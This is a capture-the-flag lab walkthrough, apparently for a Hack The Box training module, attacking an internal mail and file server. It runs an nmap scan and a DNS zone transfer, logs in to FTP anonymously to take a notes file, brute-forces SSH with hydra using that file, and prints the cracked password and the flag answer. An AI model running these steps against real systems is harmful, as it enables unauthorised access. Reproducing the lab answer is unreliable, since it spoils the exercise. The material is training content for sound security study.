Attacking Common Services - Medium

The second server is an internal server (within the inlanefreight.htb domain) that manages and stores emails and files and serves as a backup of some of the company's processes. From internal conversations, we heard that this is used relatively rarely and, in most cases, has only been used for testing purposes so far.

Question 1
Assess the target server and find the flag.txt file. Submit the contents of this file as your answer.

> nmap -sCV 10.129.201.127
53/tcp  open  domain   ISC BIND 9.16.1 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.16.1-Ubuntu

> dig AXFR inlanefreight.htb @10.129.201.127
int-ftp.inlanefreight.htb. 604800 IN	A	127.0.0.1

> sudo nano /etc/hosts
10.129.201.127 inlanefreight.htb ns.inlanefreight.htb int-ftp.inlanefreight.htb
> sudo nmap -p- -sCV -T4 int-ftp.inlanefreight.htb
2121/tcp  open  ftp      ProFTPD
30021/tcp open  ftp      ProFTPD
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x   2 ftp      ftp          4096 Apr 18  2022 simon
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

>  ftp int-ftp.inlanefreight.htb 30021
Name (int-ftp.inlanefreight.htb:checkmate): anonymous
ftp> ls
229 Entering Extended Passive Mode (|||58491|)
150 Opening ASCII mode data connection for file list
drwxr-xr-x   2 ftp      ftp          4096 Apr 18  2022 simon
226 Transfer complete
ftp> cd simon
250 CWD command successful
ftp> ls
229 Entering Extended Passive Mode (|||47067|)
150 Opening ASCII mode data connection for file list
-rw-rw-r--   1 ftp      ftp           153 Apr 18  2022 mynotes.txt
226 Transfer complete
ftp> get mynotes.txt
local: mynotes.txt remote: mynotes.txt
229 Entering Extended Passive Mode (|||61261|)
150 Opening BINARY mode data connection for mynotes.txt (153 bytes)
100% |**********************************|   153        0.88 KiB/s    00:00 ETA
226 Transfer complete
153 bytes received in 00:00 (0.16 KiB/s)

>  hydra -l 'simon' -P mynotes.txt -f ssh://10.129.78.64
[22][ssh] host: 10.129.78.64   login: simon   password: 8Ns8j1b!23hs4921smHzwn
> ssh simon@10.129.78.64
simon@lin-medium:~$ ls
flag.txt  Maildir
simon@lin-medium:~$ cat flag.txt 
HTB{1qay2wsx3EDC4rfv_M3D1UM}

